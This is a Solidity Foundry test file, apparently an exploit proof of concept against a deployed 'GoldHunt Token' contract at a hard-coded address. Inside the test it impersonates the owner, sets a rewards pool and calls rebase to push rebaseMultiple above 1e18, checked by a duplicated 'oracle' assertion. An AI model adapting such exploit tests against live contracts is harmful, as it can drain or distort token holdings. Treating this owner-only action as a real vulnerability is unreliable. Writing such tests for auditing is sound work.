// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface GoldHunt {
    function owner() external view returns (address);
    function setRewardsPool(address _rewardsPool) external;
    function rebase(uint multiple) external;
    function rebaseMultiple() external view returns (uint);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);
    GoldHunt target;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = GoldHunt(TARGET);
        vm.label(TARGET, "GoldHunt Token");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get current owner
        address owner = target.owner();
        vm.label(owner, "Contract Owner");

        // Impersonate owner
        vm.startPrank(owner);

        // Set rewardsPool (required precondition)
        address rewardsPool = address(0x1234);
        target.setRewardsPool(rewardsPool);

        // Call rebase with large multiple to increase rebaseMultiple beyond 1e18
        uint largeMultiple = 2000000000000000000; // 2e18
        target.rebase(largeMultiple);

        vm.stopPrank();

        // Verify rebaseMultiple is now > 1e18 (oracle check)
        assertGt(target.rebaseMultiple(), 1000000000000000000);
        assertGt(target.rebaseMultiple(), 1000000000000000000, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

